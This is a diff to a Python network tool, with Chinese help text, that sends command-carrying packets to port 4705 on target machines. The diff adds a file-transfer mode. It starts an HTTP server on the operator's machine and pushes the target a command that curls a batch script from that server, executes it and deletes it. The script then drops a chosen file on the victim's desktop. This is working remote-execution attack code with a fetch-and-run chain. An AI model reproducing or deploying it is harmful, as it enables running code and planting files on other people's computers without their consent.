@@ -6,12 +6,16 @@ import random
 import argparse
 import codecs
 import csv
-from time import sleep
+import secrets
+from time import monotonic, sleep
 from os import system
 from multiprocessing import Pool, freeze_support
 from dataclasses import dataclass
-from threading import Event
+from threading import Event, Lock, Thread
 from typing import Optional
+from pathlib import Path
+from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+from urllib.parse import urlsplit
 import subprocess
 import ipaddress
 
@@ -47,10 +51,19 @@ def build_parser():
     message_options.add_argument(
         '--msg-file', type=str, metavar="PATH",
         help="从 UTF-8 文件读取消息；使用 - 从标准输入读取")
+    message_options.add_argument(
+        '--file', type=str, metavar="PATH",
+        help="传送本地文件到目标电脑桌面")
     parser.add_argument(
         '-c', type=str, help="command命令 eg: -c   \"cmd.exe /c ipconfig\"")
     parser.add_argument('-l', type=int, default=1, help="循环次数，默认为1")
     parser.add_argument('-t', type=int, default=22, help="循环时间间隔，默认是22秒")
+    parser.add_argument(
+        '--file-ip', type=str, metavar="IP",
+        help="文件传送时发送端 IP，默认自动检测")
+    parser.add_argument(
+        '--file-timeout', type=int, default=120, metavar="SECONDS",
+        help="等待目标下载文件的秒数，默认 120")
     parser.add_argument(
         '-e', type=str, choices=['r', 's', 'g', 'nc', 'break', 'continue'],
         help="Extra Options加载额外的选项 eg：-e r")
@@ -176,6 +189,279 @@ def send(send_list, target_ip, port=4705, loops=1, interval=22, report=None,
                 else:
                     sleep(interval)
     return sent_count
+
+
+def format_size(size):
+    value = float(size)
+    for unit in ("B", "KiB", "MiB", "GiB", "TiB"):
+        if value < 1024 or unit == "TiB":
+            return ("%d %s" % (value, unit)) if unit == "B" else ("%.1f %s" % (value, unit))
+        value /= 1024
+
+
+def validate_listen_ip(value):
+    if value is None or not str(value).strip():
+        return None
+    try:
+        return str(ipaddress.IPv4Address(str(value).strip()))
+    except ValueError as error:
+        raise ValueError("发送端 IP 格式无效") from error
+
+
+def detect_local_ip(target=None):
+    probes = []
+    try:
+        hosts = get_ip(target) if target else []
+        if len(hosts) == 1:
+            probes.append((hosts[0], 9))
+    except ValueError:
+        pass
+    if not probes:
+        probes.append(("8.8.8.8", 80))
+    for address, port in probes:
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as probe:
+                probe.connect((address, port))
+                local = probe.getsockname()[0]
+        except OSError:
+            continue
+        if local and (address.startswith("127.") or not local.startswith("127.")):
+            return local
+    try:
+        address = socket.gethostbyname(socket.gethostname())
+        if address and not address.startswith("127."):
+            return address
+    except OSError:
+        pass
+    return "127.0.0.1"
+
+
+def validate_file_transfer(target, port, file_path):
+    if not isinstance(target, str) or not target.strip():
+        raise ValueError("请填写目标地址")
+    hosts = get_ip(target.strip())
+    if len(hosts) != 1:
+        raise ValueError("文件传送仅支持单个目标地址")
+    try:
+        port = int(port)
+    except (TypeError, ValueError) as error:
+        raise ValueError("端口必须是整数") from error
+    if not 1 <= port <= 65535:
+        raise ValueError("端口必须在 1 到 65535 之间")
+    if file_path is None or not str(file_path).strip():
+        raise ValueError("请选择要传送的文件")
+    source = Path(file_path).expanduser()
+    try:
+        if not source.exists():
+            raise ValueError("文件不存在：%s" % source)
+        if not source.is_file():
+            raise ValueError("请选择文件，而不是文件夹")
+        source.stat()
+        return source.resolve()
+    except OSError as error:
+        raise ValueError("无法读取文件：%s" % error) from error
+
+
+def build_bootstrap_script(file_url, file_name, size, desktop_dir=None):
+    if desktop_dir is None:
+        desktop_lines = (
+            'set "DESKTOP="\r\n'
+            'for /f "tokens=2,*" %%A in (\'reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders" /v Desktop 2^>nul\') do set "DESKTOP=%%B"\r\n'
+            'call set "DESKTOP=%DESKTOP%"\r\n'
+            'if not defined DESKTOP set "DESKTOP=%USERPROFILE%\\Desktop"\r\n'
+            'if not exist "%DESKTOP%" set "DESKTOP=%USERPROFILE%\\Desktop"\r\n'
+        )
+    else:
+        desktop_lines = 'set "DESKTOP=%s"\r\n' % str(desktop_dir).replace('%', '%%')
+    return (
+        "@echo off\r\n"
+        "chcp 65001>nul\r\n"
+        "setlocal DisableDelayedExpansion\r\n"
+        + desktop_lines
+        + 'set "TARGET=%DESKTOP%\\' + str(file_name).replace('%', '%%') + '"\r\n'
+        + 'set "PART=%TARGET%.part"\r\n'
+        + 'del /f /q "%PART%" >nul 2>nul\r\n'
+        + 'curl.exe -fsSL --noproxy "*" --retry 2 -o "%PART%" "' + file_url.replace('%', '%%') + '"\r\n'
+        + 'if errorlevel 1 goto fail\r\n'
+        + 'for %%A in ("%PART%") do if not "%%~zA"=="' + str(int(size)) + '" goto fail\r\n'
+        + 'move /y "%PART%" "%TARGET%" >nul\r\n'
+        + 'if errorlevel 1 goto fail\r\n'
+        + 'exit /b 0\r\n'
+        + ':fail\r\n'
+        + 'del /f /q "%PART%" >nul 2>nul\r\n'
+        + 'exit /b 1\r\n'
+    )
+
+
+def build_transfer_command(bootstrap_url):
+    command = ('cmd /c curl -fsSL --noproxy * -o "%%TEMP%%\\jyt.cmd" "%s" '
+               '&&call "%%TEMP%%\\jyt.cmd"&del /f /q "%%TEMP%%\\jyt.cmd"') % bootstrap_url
+    if len(command.encode('utf-16le')) // 2 > COMMAND_MAX_BYTES // 2:
+        raise ValueError("文件传送命令超过报文容量")
+    return command
+
+
+class _FileTransferRequestHandler(BaseHTTPRequestHandler):
+    protocol_version = "HTTP/1.0"
+
+    def log_message(self, format, *args):
+        return
+
+    def do_GET(self):
+        transfer = self.server.transfer
+        path = urlsplit(self.path).path
+        if path == "/b/" + transfer.token:
+            body = transfer.bootstrap_script.encode("utf-8-sig")
+            self.send_response(200)
+            self.send_header("Content-Type", "text/plain; charset=utf-8")
+            self.send_header("Content-Length", str(len(body)))
+            self.send_header("Cache-Control", "no-store")
+            self.end_headers()
+            self.wfile.write(body)
+            return
+        if path == "/f/" + transfer.token:
+            self._send_file(transfer)
+            return
+        self.send_error(404)
+
+    def _send_file(self, transfer):
+        try:
+            size = transfer.source.stat().st_size
+        except OSError:
+            self.send_error(404)
+            return
+        self.send_response(200)
+        self.send_header("Content-Type", "application/octet-stream")
+        self.send_header("Content-Length", str(size))
+        self.send_header("Cache-Control", "no-store")
+        self.send_header("Content-Disposition", "attachment")
+        self.end_headers()
+        sent = 0
+        try:
+            with transfer.source.open("rb") as source:
+                while True:
+                    chunk = source.read(64 * 1024)
+                    if not chunk:
+                        break
+                    self.wfile.write(chunk)
+                    sent += len(chunk)
+                    transfer.report_progress(sent, size)
+        except OSError as error:
+            transfer.fail("目标下载中断：%s" % error)
+            return
+        if sent == size:
+            transfer.report_progress(size, size)
+            transfer.complete()
+        else:
+            transfer.fail("文件传输不完整")
+
+
+class FileTransferServer:
+    def __init__(self, source, bind_host="0.0.0.0", port=0):
+        self.source = Path(source)
+        self.token = secrets.token_urlsafe(12)
+        self.bootstrap_script = ""
+        self.downloaded = Event()
+        self.error = ""
+        self.progress = None
+        self._progress_value = -1
+        self._lock = Lock()
+        self.httpd = ThreadingHTTPServer((bind_host, port), _FileTransferRequestHandler)
+        self.httpd.transfer = self
+        self.httpd.daemon_threads = True
+        self.thread = Thread(target=self.httpd.serve_forever, daemon=True)
+
+    @property
+    def port(self):
+        return self.httpd.server_address[1]
+
+    def start(self):
+        self.thread.start()
+
+    def stop(self):
+        if self.thread.is_alive():
+            self.httpd.shutdown()
+            self.thread.join(timeout=2)
+        self.httpd.server_close()
+
+    def bootstrap_url(self, host):
+        return "http://%s:%d/b/%s" % (host, self.port, self.token)
+
+    def file_url(self, host):
+        return "http://%s:%d/f/%s" % (host, self.port, self.token)
+
+    def report_progress(self, sent, total):
+        if self.progress is None:
+            return
+        percent = 100 if total == 0 else min(100, int(sent * 100 / total))
+        percent = 100 if percent == 100 else percent // 5 * 5
+        with self._lock:
+            if percent == self._progress_value:
+                return
+            self._progress_value = percent
+        try:
+            self.progress("目标正在下载文件：%d%%" % percent)
+        except Exception:
+            pass
+
+    def complete(self):
+        self.downloaded.set()
+
+    def fail(self, message):
+        with self._lock:
+            if not self.error:
+                self.error = message
+        self.downloaded.set()
+
+    def wait(self, timeout=120, cancel_event=None):
+        try:
+            timeout = float(timeout)
+        except (TypeError, ValueError) as error:
+            raise ValueError("等待时间必须是数字") from error
+        if timeout <= 0:
+            raise ValueError("等待时间必须大于 0")
+        deadline = monotonic() + timeout
+        while not self.downloaded.is_set():
+            if cancel_event and cancel_event.is_set():
+                raise RuntimeError("操作已取消")
+            remaining = deadline - monotonic()
+            if remaining <= 0:
+                raise RuntimeError("等待目标下载超时，请检查目标是否能访问发送端 IP 和端口")
+            self.downloaded.wait(min(0.2, remaining))
+        if self.error:
+            raise RuntimeError(self.error)
+
+
+def transfer_file(target, port, file_path, listen_ip=None, timeout=120,
+                  cancel_event=None, report=None, desktop_dir=None):
+    emit = report or (lambda message: None)
+    source = validate_file_transfer(target, port, file_path)
+    if cancel_event and cancel_event.is_set():
+        raise RuntimeError("操作已取消")
+    advertised_ip = validate_listen_ip(listen_ip) or detect_local_ip(target)
+    bind_host = "127.0.0.1" if advertised_ip.startswith("127.") else "0.0.0.0"
+    transfer = FileTransferServer(source, bind_host=bind_host)
+    try:
+        transfer.start()
+        size = source.stat().st_size
+        transfer.bootstrap_script = build_bootstrap_script(
+            transfer.file_url(advertised_ip), source.name, size, desktop_dir)
+        transfer.progress = emit
+        command = build_transfer_command(transfer.bootstrap_url(advertised_ip))
+        emit("文件传送服务已启动：%s:%d" % (advertised_ip, transfer.port))
+        emit("正在向目标发送文件传送命令")
+        send([pkg_sendlist("-c", command)], target, port, 1, 0, emit, cancel_event)
+        emit("等待目标下载到桌面")
+        transfer.wait(timeout, cancel_event)
+        emit("目标已下载文件：%s（%s）" % (source.name, format_size(size)))
+        return {
+            "name": source.name,
+            "size": size,
+            "target": target,
+            "listen_ip": advertised_ip,
+        }
+    finally:
+        transfer.stop()
 
 
 @dataclass
@@ -405,11 +691,25 @@ def netcat(num, arguments):
     send(send_list, arguments.ip, arguments.p, arguments.l, arguments.t)
 
 
+def run_file_transfer(arguments):
+    result = transfer_file(
+        arguments.ip, arguments.p, arguments.file,
+        listen_ip=arguments.file_ip, timeout=arguments.file_timeout, report=print)
+    print("文件已传送：%s（%s）" % (result["name"], format_size(result["size"])))
+    return 0
+
+
 def run_from_cmd(arguments):
     try:
         single_command(arguments)
         if arguments.e in {'g', 'break', 'continue'}:
             return
+        if arguments.file:
+            if arguments.e or arguments.msg or arguments.msg_file or arguments.c:
+                raise ValueError("文件传送不能与消息、命令或 -e 扩展功能同时使用")
+            return run_file_transfer(arguments)
+        if arguments.file_ip or arguments.file_timeout != 120:
+            raise ValueError("--file-ip 和 --file-timeout 仅用于文件传送")
         if arguments.e != 'nc':
             send_list = creat_send_object(arguments)
             send(send_list, arguments.ip, arguments.p, arguments.l, arguments.t,
